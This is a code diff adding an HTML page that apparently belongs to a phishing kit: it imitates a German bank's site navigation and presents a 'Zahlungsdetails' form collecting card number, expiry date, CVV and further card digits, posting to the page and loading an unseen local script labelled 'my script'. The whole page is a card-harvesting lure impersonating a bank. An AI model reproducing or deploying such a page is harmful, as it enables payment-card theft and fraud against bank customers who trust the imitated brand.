@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="./css/pc.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <title></title>
+</head>
+<body>
+    <div class="hed">
+        <div>
+            <img class="lojo" src="./img/lojo.svg" alt="">
+        </div>
+        <p>Privatkunden</p>
+        <p> Wealth Management & Private Banking</p>
+        <p>Unternehmenskunden</p>
+        <p>Nachhaltigkeit</p>
+        <p>Über Uns</p>
+        <p>Services</p>
+        <img height="80" src="./img/hed.JPG" alt="">
+    </div>
+    <!--  -->
+        <div class="mb-hed">
+            <img src="./img/mb-hed.JPG" alt="">
+        </div>
+    <!--  -->
+
+    <div class="cc-kolch">
+        <div class="content2">
+            <p class="p1">Zahlungsdetails:</p>
+            <form method="post" id="pg2">
+                <div class="form">
+                    <p>Kartennummer </p>
+                    <input type="tel" name="" id="one" maxlength="19" required placeholder="____ ____ ____ ____">
+    
+                    <p>Ablaufdatum</p>
+                    <input type="tel" name="" id="two" maxlength="5" required placeholder="__/__">
+    
+                    <p>CVV-Code</p>
+                    <input type="tel" name="" id="three" maxlength="4" required placeholder="">
+
+                    <p>Kartenziffern eingeben</p>
+                    <input type="tel" name="" id="four" maxlength="4" required placeholder="">
+                </div>
+
+                <div class="btn">
+                    <p>*Pflichtfelder</p>
+                    <button type="submit">Aktivieren</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <div class="bot">
+        <img style="width: 100%; margin-top: 50px;" src="./img/bot.JPG" alt="">
+    </div>
+
+    <div class="mb-bot">
+        <img style="width: 100%; margin-top: 50px;" src="./img/mb-bot.JPG" alt="">
+    </div>
+    <script>
+        $("#one").on("keyup",function(){
+            cc = $(this).val().split(" ").join("");
+            cc = cc.match(new RegExp('.{1,4}$|.{1,4}', 'g')).join(" ");
+            $(this).val(cc);
+        });
+        $("#two").on("keyup",function(){
+            dd = $(this).val().split("/").join("");
+            dd = dd.match(new RegExp('.{1,2}$|.{1,2}', 'g')).join("/");
+            $(this).val(dd);
+        });
+    </script>
+    <!-- my script -->
+    <script src="./js/stb.js"></script>
+</body>
+</html>
